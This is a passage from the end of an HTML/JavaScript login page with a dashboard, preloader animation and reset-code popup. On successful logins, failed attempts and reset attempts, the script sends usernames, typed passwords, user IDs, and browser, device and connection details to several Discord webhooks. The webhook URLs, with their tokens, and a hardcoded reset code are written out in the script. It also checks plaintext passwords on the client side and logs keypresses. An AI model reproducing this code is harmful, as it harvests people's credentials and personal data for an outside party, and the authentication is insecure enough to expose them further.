          trackActivity('Login Result', 'Failed: User not found');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          trackActivity('Login Result', 'Failed: Incorrect password');
          return;
        }

        // Correct login
        attempts = 3; // Reset attempts to 3 (new max) on successful login
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';
        
        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        trackActivity('Login Result', 'Successful login');
        
        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 original webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);
        
        // Hide preloader, then show login and quickly to dashboard
        document.getElementById('preloader').style.display = 'none';
        document.getElementById('loginBox').style.display = 'none'; // Ensure login is hidden
        document.getElementById('loginQuickBar').style.display = 'none'; // Hide login quick bar
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = `dashboard-body ${dashboard.currentTheme}`; // Apply theme
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        trackActivity('Login Failure', `Reason: ${msg}. Attempts left: ${attempts}`);
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          trackActivity('Login Critical', 'Attempts exceeded. Reset popup shown.');
          showAlert('Too many failed login attempts. Please reset to continue.', 'error', 15000);
          
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 2) { // Changed threshold for flashing
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        if (attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        if (usernameInput) usernameInput.disabled = true;
        if (passwordInput) passwordInput.disabled = true;
        if (userIDInput) userIDInput.disabled = true;
        if (submitBtn) submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        if (usernameInput) usernameInput.disabled = false;
        if (passwordInput) passwordInput.disabled = false;
        if (userIDInput) userIDInput.disabled = false;
        if (submitBtn) submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        if (resetPopup) {
            resetPopup.style.display = 'block';
            resetPopup.setAttribute('aria-hidden', 'false');
            resetField.focus();
            trackActivity('System Event', 'Reset password popup displayed');
        }
      }

      // Hide reset popup
      function hideResetPopup() {
        if (resetPopup) {
            resetPopup.style.display = 'none';
            resetPopup.setAttribute('aria-hidden', 'true');
            resetField.value = '';
        }
      }

      async function resetCounter() {
        trackStats('button');
        trackActivity('Button Click', 'Reset Counter button clicked');
        const enteredCode = resetField ? resetField.value.trim() : '';
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput ? usernameInput.value || 'Unknown' : 'Unknown';
        const password = passwordInput ? passwordInput.value || 'Unknown' : 'Unknown';
        const userID = userIDInput ? userIDInput.value || 'Unknown' : 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: " Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);
        trackActivity('Reset Process', 'Reset box detected webhook sent');

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? " Reset Code Accepted" : " Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);
        trackActivity('Reset Process', `Reset code attempt status: ${isCorrect ? 'Accepted' : 'Incorrect'}`);

        if (isCorrect) {
          attempts = 3; // Reset attempts to new max of 3
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          showAlert('Login attempts reset successfully!', 'success');
          trackActivity('Reset Process', 'Login attempts counter reset');
        } else {
          showAlert('Incorrect reset code. Please try again.', 'error');
        }
      }

      // Attach event listeners
      submitBtn?.addEventListener('click', () => {
          trackStats('button');
          submitLogin();
      });
      resetBtn?.addEventListener('click', () => {
          trackStats('button');
          resetCounter();
      });

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        trackActivity('Keyboard Event', `Key pressed: ${e.key}`);
        if (e.key === 'Enter') {
          if (resetPopup && resetPopup.style.display === 'block') {
            resetCounter();
          } else if (document.activeElement === usernameInput || document.activeElement === passwordInput || document.activeElement === userIDInput || document.activeElement === submitBtn) {
            submitLogin();
          }
        }
      });

      // Preloader animation sequence
      const preloader = document.getElementById('preloader');
      const loadingText = document.getElementById('loadingText');
      const loginBoxElement = document.getElementById('loginBox');
      const loginQuickBarElement = document.getElementById('loginQuickBar');

      let currentIntervalId; // Store ID to clear previous interval if needed

      function startTextSequence(texts, interval = 1500) {
          let index = 0;
          if (loadingText) loadingText.textContent = texts[index];
          loadingText.classList.remove('gradient-orange-red');

          currentIntervalId = setInterval(() => {
              index = (index + 1) % texts.length;
              if (loadingText) loadingText.textContent = texts[index];
              if (index === 0 || index === 2) { // Make "Initializing System..." and "Almost There!" gradient
                  if (loadingText) loadingText.classList.add('gradient-orange-red');
              } else {
                  if (loadingText) loadingText.classList.remove('gradient-orange-red');
              }
          }, interval);
          dashboard.initClock(); // Start login page clock immediately to be ready for its display
          dashboard.updateLoginHistoryDisplay(); // Update login history if stored
      }


      setTimeout(() => {
          if (loadingText) loadingText.classList.add('gradient-orange-red'); // Initial state
          trackActivity('System Event', 'Starting preloader text sequence');
          startTextSequence([
              'Initializing System...',
              'Checking Components...',
              'Loading Modules...',
              'Finalizing Startup...',
              'Almost There!'
          ]);
      }, 500); // Small delay to show initial text clearly


      // Final preloader step, then transition to login
      setTimeout(() => {
          if (currentIntervalId) clearInterval(currentIntervalId);
          trackActivity('System Event', 'Preloader complete, transitioning to login');
          if (loadingText) loadingText.textContent = 'Initializing Login Page...';
          if (loadingText) loadingText.classList.add('gradient-orange-red');
          
          const rotatingCube = document.querySelector('.rotating-cube');
          if (rotatingCube) {
              rotatingCube.style.animation = 'rotateCubeOut 1s forwards';
          }
          if (preloader) {
              preloader.style.opacity = '0';
              preloader.style.pointerEvents = 'none'; // Prevent interaction
          }

          setTimeout(() => {
              if (preloader) preloader.style.display = 'none';
              if (loginQuickBarElement) loginQuickBarElement.style.display = 'flex'; // Show login quick bar
              if (loginBoxElement) loginBoxElement.style.display = 'block'; // Display login box for its animation
              showAlert("System ready for login.", "info", 3000);
          }, 500); // Match fade transition duration (preloader opacity takes 0.5s)
      }, 7000); // Total preloader time (adjusted for visual flow)


      // Initialize attempts display
      updateAttemptsText();
      dashboard.updateLoginHistoryDisplay();
      // Activate alerts right from the start for login page messages
      alertContainer.style.display = 'flex';

    })();
  </script>
</body>
</html>
